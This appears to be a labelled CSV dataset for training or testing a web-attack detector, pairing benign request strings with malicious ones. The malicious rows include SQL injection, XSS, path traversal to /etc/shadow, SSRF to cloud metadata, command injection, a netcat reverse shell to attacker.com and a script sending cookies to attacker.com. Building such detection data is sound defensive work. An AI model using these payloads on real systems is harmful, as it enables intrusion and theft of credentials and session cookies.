"text","label"
"search=tablet","0"
"user_id=861&action=view","0"
"category=laptops page=9","0"
"order_id=ORD-6363 status=confirmed","0"
"id=' OR 1=1--","1"
"ping=; ping -c 4 attacker.com","1"
"GET /health HTTP/1.1","0"
"GET /api/files?name=../../../../etc/passwd","1"
"GET /api/users?id=' OR 1=1--","1"
"Authorization: Bearer validtoken267","0"
"category=laptops page=8","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"order_id=ORD-5933 status=confirmed","0"
"GET /server-status HTTP/1.1","1"
"page=45&limit=20","0"
"GET /api/data/3290","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=administrator&password=1234567890","1"
"../../../etc/shadow","1"
"name=<div onmouseover=alert(1)>hover</div>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-8041 status=confirmed","0"
"GET /backup.sql HTTP/1.1","1"
"order_id=ORD-7682 status=confirmed","0"
"GET /web.config HTTP/1.1","1"
"User-Agent: Nikto/2.5.0","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/login/2142","0"
"GET /api/orders?id=123&format=json","0"
"DELETE /dashboard?status=pending&priority=high","0"
"search=<script >alert(1)</script >","1"
"user_id=267&action=view","0"
"GET /api/orders/7954","0"
"page=41&limit=20","0"
"url=http://10.0.0.1","1"
"category=tablets page=1","0"
"title=<div onmouseover=alert(1)>hover</div>","1"
"password spray attack detected multiple users","1"
"repeated authentication failure admin account locked","1"
"order_id=ORD-4674 status=confirmed","0"
"name=Omar email=755@mail.com","0"
"name=Ahmed email=407@mail.com","0"
"page=45&limit=50","0"
"Authorization: Bearer validtoken380","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Omar email=196@mail.com","0"
"brute force attempt on login endpoint from single ip","1"
"order_id=1' OR '1'='1' /*","1"
"<svg onload=alert(1)>","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"order_id=1' AND SLEEP(5)--","1"
"order_id=ORD-1114 status=confirmed","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"order_id=ORD-1718 status=confirmed","0"
"GET file:///etc/passwd","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /robots.txt scan probe reconnaissance","1"
"user_id=181&action=view","0"
"comment=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"url=http://localhost:8080","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /health HTTP/1.1","0"
"id=' OR '1'='1'--","1"
"search=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"limit=20&offset=0","0"
"Authorization: Bearer validtoken860","0"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"order_id=ORD-8874 status=confirmed","0"
"PUT /settings?user=ahmed&filter=active","0"
"search=headphones","0"
"POST /api/products body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"search=phone","0"
"name=Nour email=339@mail.com","0"
"file=../../../var/www/html/config.php","1"
"page=31&limit=50","0"
"GET /api/search?q=<ScRiPt>alert(1)</ScRiPt>","1"
"POST /api/login username=1'; EXEC xp_cmdshell('whoami')-- password=test","1"
"user_id=458&action=view","0"
"user_id=286&action=view","0"
"GET /health HTTP/1.1","0"
"../../../../var/log/apache2/access.log","1"
"User-Agent: Nmap Scripting Engine","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"q=smartphone&brand=samsung","0"
"category=tablets page=3","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"user_id=683&action=view","0"
"url=http://127.0.0.1/admin","1"
"include=../../../var/www/html/config.php","1"
"repeated authentication failure admin account locked","1"
"category=phones page=8","0"
"GET /api/users/2065","0"
"GET /health HTTP/1.1","0"
"message=<img src=`javascript:alert(1)`>","1"
"category=audio page=9","0"
"`id`","1"
"name=Omar email=846@mail.com","0"
"id=123&format=json","0"
"brute force attempt on login endpoint from single ip","1"
"GET /health HTTP/1.1","0"
"file=/etc/passwd%00","1"
"page=19&limit=50","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET file:///etc/passwd","1"
"GET /health HTTP/1.1","0"
"POST /api/login username=admin'-- password=test","1"
"order_id=ORD-1886 status=confirmed","0"
"GET /api/login/6169","0"
"user_id=306&action=view","0"
"url=http://metadata.google.internal","1"
"search=tablet","0"
"DELETE /api/users?category=electronics&page=1","0"
"message=<script>alert('XSS')</script>","1"
"order_id=ORD-2845 status=confirmed","0"
"order_id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"GET php://filter/convert.base64-encode/resource=config.php","1"
"brute force attempt on login endpoint from single ip","1"
"|| nc -e /bin/sh attacker.com 4444","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /dashboard/6080","0"
"status=pending&priority=high","0"
"GET /health HTTP/1.1","0"
"id='; UPDATE users SET password='hacked' WHERE 1=1--","1"
"order_id=ORD-7331 status=confirmed","0"
"user_id=954&action=view","0"
"page=14&limit=50","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"host=; cat /etc/shadow","1"
"User-Agent: Nikto/2.5.0","1"
"comment=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=administrator&password=superman","1"
"POST /api/products?status=pending&priority=high","0"
"user_id=484&action=view","0"
"GET /health HTTP/1.1","0"
"DELETE /profile User-Agent: PostmanRuntime/7.36.0","0"
"username=user&password=superman","1"
"user=ahmed&filter=active","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=gopher://127.0.0.1:25/","1"
"GET /.git/config HTTP/1.1","1"
"GET /.env HTTP/1.1","1"
"1 UNION SELECT 1,2,3--","1"
"username=root&password=qwerty","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"fetch=http://internal-service:8080/secret","1"
"DELETE /dashboard?user=ahmed&filter=active","0"
"GET /api/search/182","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"ping=& whoami","1"
